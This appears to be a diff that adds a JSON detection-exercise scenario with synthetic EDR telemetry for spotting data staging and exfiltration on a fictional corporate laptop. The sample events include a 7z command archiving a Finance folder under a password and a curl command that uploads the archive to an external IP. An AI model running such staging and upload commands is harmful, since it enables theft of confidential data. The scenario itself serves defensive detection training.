@@ -1,0 +1,33 @@
+{
+  "scenario_key": "3_data_exfiltration",
+  "title": "Detect Data Exfiltration & Staging",
+  "objective": "Detect local archive staging (.7z in %TEMP%) followed by high-volume outbound data transfer over C2 protocols.",
+  "target_environment": "corp.local EDR Telemetry & Perimeter Gateway",
+  "telemetry_sources": ["Windows Events", "Network Traffic", "DNS Logs", "Cloud Logs"],
+  "telemetry_events": [
+    {
+      "timestamp": "2026-08-06T19:40:00Z",
+      "host": "exec-laptop-01",
+      "user": "CORP\\a.davis",
+      "process": "7z.exe",
+      "command": "7z.exe a -t7z -pP@ssw0rd2026 C:\\Users\\a.davis\\AppData\\Local\\Temp\\confidential_q3.7z C:\\Users\\a.davis\\Documents\\Finance\\*",
+      "event_id": 11
+    },
+    {
+      "timestamp": "2026-08-06T19:42:15Z",
+      "host": "exec-laptop-01",
+      "user": "CORP\\a.davis",
+      "process": "curl.exe",
+      "command": "curl -X POST -F 'file=@C:\\Users\\a.davis\\AppData\\Local\\Temp\\confidential_q3.7z' https://185.220.101.5/upload/data",
+      "event_id": 3
+    },
+    {
+      "timestamp": "2026-08-06T19:43:00Z",
+      "host": "exec-laptop-01",
+      "user": "CORP\\a.davis",
+      "process": "svchost.exe",
+      "command": "Outbound HTTPS Connection: 48.2 MB transferred to destination IP 185.220.101.5 over port 443",
+      "event_id": 5156
+    }
+  ]
+}
